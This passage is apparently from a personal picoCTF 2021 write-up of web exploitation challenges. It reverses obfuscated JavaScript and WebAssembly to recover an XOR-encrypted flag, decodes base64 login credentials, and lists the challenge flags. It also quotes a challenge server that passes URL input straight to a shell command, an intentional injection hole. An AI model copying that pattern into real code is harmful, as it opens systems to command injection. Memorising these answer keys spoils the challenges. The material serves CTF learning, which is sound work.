	<h4>Enter flag:</h4>
	<input type="text" id="input"/>
	<button onclick="onButtonPress()">Submit</button>
	<p id="result"></p>
</body>
</html>
~~~

This shows the external javascript file call, rTEuOmSfG3.js:

~~~js
const _0x143f = ['exports', 
                 '270328ewawLo', 
                 'instantiate', 
                 '1OsuamQ', 
                 'Incorrect!', 
                 'length', 
                 'copy_char', 
                 'value', 
                 '1512517ESezaM', 
                 'innerHTML', 
                 'check_flag', 
                 'result', 
                 '1383842SQRPPf', 
                 '924408cukzgO', 
                 'getElementById', 
                 '418508cLDohp', 
                 'input', 
                 'Correct!', 
                 '573XsMMHp', 
                 'arrayBuffer', 
                 '183RUQBDE', 
                 '38934oMACea'];
const _0x187e = function(_0x3075b9, _0x2ac888) {
    _0x3075b9 = _0x3075b9 - 0x11d;
    let _0x143f7d = _0x143f[_0x3075b9];
    return _0x143f7d;
};
(function(_0x3379df, _0x252604) {
    const _0x1e2b12 = _0x187e;
    while (!![]) {
        try {
            const _0x5e2d0a = -parseInt(_0x1e2b12(0x122)) + 
                  -parseInt(_0x1e2b12(0x12f)) + 
                  -parseInt(_0x1e2b12(0x126)) * 
                  -parseInt(_0x1e2b12(0x12b)) + 
                  -parseInt(_0x1e2b12(0x132)) + 
                  parseInt(_0x1e2b12(0x124)) + 
                  -parseInt(_0x1e2b12(0x121)) * 
                  -parseInt(_0x1e2b12(0x11f)) + 
                  parseInt(_0x1e2b12(0x130));
            if (_0x5e2d0a === _0x252604) break;
            else _0x3379df['push'](_0x3379df['shift']());
        } catch (_0x289152) {
            _0x3379df['push'](_0x3379df['shift']());
        }
    }
}(_0x143f, 0xed04c));
let exports;
(async () => {
    const _0x484ae0 = _0x187e;
    let _0x487b31 = await fetch('./qCCYI0ajpD'),
        _0x5eebfd = await WebAssembly[_0x484ae0(0x125)](await _0x487b31[_0x484ae0(0x120)]()),
        _0x30f3ed = _0x5eebfd['instance'];
    exports = _0x30f3ed[_0x484ae0(0x123)];
})();

function onButtonPress() {
    const _0x271e58 = _0x187e;
    let _0x441124 = document[_0x271e58(0x131)](_0x271e58(0x11d))[_0x271e58(0x12a)];
    for (let _0x34c54a = 0x0; _0x34c54a < _0x441124[_0x271e58(0x128)]; _0x34c54a++) {
        exports[_0x271e58(0x129)](_0x441124['charCodeAt'](_0x34c54a), _0x34c54a);
    }
    exports[_0x271e58(0x129)](0x0, _0x441124[_0x271e58(0x128)]), exports[_0x271e58(0x12d)]() == 0x1 ? document[_0x271e58(0x131)](_0x271e58(0x12e))[_0x271e58(0x12c)] = _0x271e58(0x11e) : document[_0x271e58(0x131)](_0x271e58(0x12e))['innerHTML'] = _0x271e58(0x127);
}
~~~

This javascript code calls an external file, ./qCCYI0ajpD which when downloaded, can be identified as a web-assembly.  This can be decompiled:

~~~bash
$ wasm-decompile qCCYI0ajpD > decompiled_wasm.txt
~~~

The decompiled wasm can be reviewed:

~~~
export memory memory(initial: 2, max: 0);

global g_a:int = 66864;
export global input:int = 1072;
export global key:int = 1067;
global dso_handle:int = 1024;
global data_end:int = 1328;
global global_base:int = 1024;
global heap_base:int = 66864;
global memory_base:int = 0;
global table_base:int = 1;

table T_a:funcref(min: 1, max: 1);

data d_a(offset: 1024) = 
  "\9dn\93\c8\b2\b9A\8b\c5\c6\dda\93\c3\c2\da?\c7\93\c1\8b1\95\93\93\8eb\c8"
  "\94\c9\d5d\c0\96\c4\d97\93\93\c2\90\00\00";
data d_b(offset: 1067) = "\f1\a7\f0\07\ed";

function wasm_call_ctors() {
}

export function strcmp(a:int, b:int):int {
  var c:int = g_a;
  var d:int = 32;
  var e:int = c - d;
  e[6]:int = a;
  e[5]:int = b;
  var f:int = e[6]:int;
  e[4]:int = f;
  var g:int = e[5]:int;
  e[3]:int = g;
  loop L_b {
    var h:ubyte_ptr = e[4]:int;
    var i:int = 1;
    var j:int = h + i;
    e[4]:int = j;
    var k:int = h[0];
    e[11]:byte = k;
    var l:ubyte_ptr = e[3]:int;
    var m:int = 1;
    var n:int = l + m;
    e[3]:int = n;
    var o:int = l[0];
    e[10]:byte = o;
    var p:int = e[11]:ubyte;
    var q:int = 255;
    var r:int = p & q;
    if (r) goto B_c;
    var s:int = e[11]:ubyte;
    var t:int = 255;
    var u:int = s & t;
    var v:int = e[10]:ubyte;
    var w:int = 255;
    var x:int = v & w;
    var y:int = u - x;
    e[7]:int = y;
    goto B_a;
    label B_c:
    var z:int = e[11]:ubyte;
    var aa:int = 255;
    var ba:int = z & aa;
    var ca:int = e[10]:ubyte;
    var da:int = 255;
    var ea:int = ca & da;
    var fa:int = ba;
    var ga:int = ea;
    var ha:int = fa == ga;
    var ia:int = 1;
    var ja:int = ha & ia;
    if (ja) continue L_b;
  }
  var ka:int = e[11]:ubyte;
  var la:int = 255;
  var ma:int = ka & la;
  var na:int = e[10]:ubyte;
  var oa:int = 255;
  var pa:int = na & oa;
  var qa:int = ma - pa;
  e[7]:int = qa;
  label B_a:
  var ra:int = e[7]:int;
  return ra;
}

export function check_flag():int {
  var a:int = 0;
  var b:int = 1072;
  var c:int = 1024;
  var d:int = strcmp(c, b);
  var e:int = d;
  var f:int = a;
  var g:int = e != f;
  var h:int = -1;
  var i:int = g ^ h;
  var j:int = 1;
  var k:int = i & j;
  return k;
}

function copy(a:int, b:int) {
  var c:int = g_a;
  var d:int = 16;
  var e:int_ptr = c - d;
  e[3] = a;
  e[2] = b;
  var f:int = e[3];
  if (eqz(f)) goto B_a;
  var g:int = 4;
  var h:int = e[2];
  var i:int = 5;
  var j:int = h % i;
  var k:ubyte_ptr = g - j;
  var l:int = k[1067];
  var m:int = 24;
  var n:int = l << m;
  var o:int = n >> m;
  var p:int = e[3];
  var q:int = p ^ o;
  e[3] = q;
  label B_a:
  var r:int = e[3];
  var s:byte_ptr = e[2];
  s[1072] = r;
}
~~~

The encrypted flag and key can be identified from this assembly:

~~~
Encrypted Flag: \9dn\93\c8\b2\b9A\8b\c5\c6\dda\93\c3\c2\da?\c7\93\c1\8b1\95\93\93\8eb\c8\94\c9\d5d\c0\96\c4\d97\93\93\c2\90\00\00
Key: \f1\a7\f0\07\ed
~~~

We can find the deciphered flag using the known xor flag substring "picoC":

~~~py
enc = [0x9d,0x6e,0x93,0xc8,0xb2,0xb9,0x41,0x8b,0xc5,0xc6,0xdd,0x61,0x93,0xc3,0xc2,0xda,0x3f,0xc7,0x93,0xc1,0x8b,0x31,0x95,0x93,0x93,0x8e,0x62,0xc8,0x94,0xc9,0xd5,0x64,0xc0,0x96,0xc4,0xd9,0x37,0x93,0x93,0xc2,0x90,0x00,0x00]
key = [0xf1, 0xa7, 0xf0, 0x07, 0xed]
key2 = []
out1 = "picoC"
flag = ""

for i in range(len(out1)):
    key2.append(enc[i]^ord(out1[i]))
    
i = 0
for l in enc:
    flag += chr(l^key2[i])
    i += 1
    if i==5:
        i = 0
~~~

This returns the flag.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{b70fcd378740f6e4bce8388c01540c43}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Web Gauntlet 2

- Author: MADSTACKS
- 170 Points

### Description

This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:21336/ Filter: http://mercury.picoctf.net:21336/filter.php

### Hints

1. I tried to make it a little bit less contrived since the mini competition.
2. Each filter is separated by a space. Spaces are not filtered.
3. There is only 1 round this time, when you beat it the flag will be in filter.php.
4. There is a length component now.
5. sqlite

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Some Assembly Required 4

- Author: SEARS SCHULZ
- 200 Points

### Description

http://mercury.picoctf.net:54609/index.html

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## X marks the spot

- Author: MADSTACKS
- 250 Points

### Description

Another login you have to bypass. Maybe you can find an injection that works? http://mercury.picoctf.net:33594/

### Hints

1. XPATH

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Web Gauntlet 3

- Author: MADSTACKS
- 300 Points

### Description

Last time, I promise! Only 25 characters this time. Log in as admin Site: http://mercury.picoctf.net:28715/ Filter: http://mercury.picoctf.net:28715/filter.php

### Hints

1. Each filter is separated by a space. Spaces are not filtered.
2. There is only 1 round this time, when you beat it the flag will be in filter.php.
3. sqlite

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Bithug

- Author: ZWAD3
- 500 Points

### Description

Code management software is way too bloated. Try our new lightweight solution, BitHug.
Source: distribution.tgz

### Hints

1. Every user gets their own target repository to attack called _/.git, but no permission to read it

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## login

- Author: BrownieInMotion
- 100 Points

### Description

My dog-sitter's brother made this website but I can't get in; can you help?

login.mars.picoctf.net

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

If we inspect the source for the webpage we can see a javascript source:
	
~~~html
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="styles.css">
        <script src="index.js"></script>
    </head>
    <body>
        <div>
          <h1>Login</h1>
          <form method="POST">
            <label for="username">Username</label>
            <input name="username" type="text"/>
            <label for="username">Password</label>
            <input name="password" type="password"/>
            <input type="submit" value="Submit"/>
          </form>
        </div>
    </body>
</html>
~~~

The javascript source can be viewed in a browser:

~~~js
(async()=>{await new Promise((e=>window.addEventListener("load",e))),document.querySelector("form").addEventListener("submit",(e=>{e.preventDefault();const r={u:"input[name=username]",p:"input[name=password]"},t={};for(const e in r)t[e]=btoa(document.querySelector(r[e]).value).replace(/=/g,"");return"YWRtaW4"!==t.u?alert("Incorrect Username"):"cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ"!==t.p?alert("Incorrect Password"):void alert(`Correct Password! Your flag is ${atob(t.p)}.`)}))})();
~~~

To make this easier to read, we can use a [deobfuscator](https://deobfuscate.io/) to show us a formatted version

~~~js
(async () => {
  await new Promise(e => window.addEventListener("load", e)), document.querySelector("form").addEventListener("submit", e => {
    e.preventDefault();
    const r = {u: "input[name=username]", p: "input[name=password]"}, t = {};
    for (const e in r) t[e] = btoa(document.querySelector(r[e]).value).replace(/=/g, "");
    return "YWRtaW4" !== t.u ? alert("Incorrect Username") : "cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ" !== t.p ? alert("Incorrect Password") : void alert(`Correct Password! Your flag is ${atob(t.p)}.`);
  });
})();
~~~

We can see the username and password are iterated through to generate a base64 encoded string which is used to validate the logon details.  We can use an [online base64 decoder](https://www.base64decode.org/) to view the original strings:

~~~
YWRtaW4 => admin
cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ => picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
~~~

This gives us the flag:

~~~
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## caas

- Author: BrownieInMotion
- 150 Points

### Description

Now presenting cowsay as a service

### Hints

None

### Attachments

<details>

<summary markdown="span">index.js</summary>

~~~js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
~~~

</details>

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---


## notepad

- Author: ginkoid
- 250 Points

### Description

This note-taking site seems a bit off. [notepad.mars.picoctf.net](notepad.mars.picoctf.net)

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

Last updated 09 May 2021.

## [djm89uk.github.io](https://djm89uk.github.io)
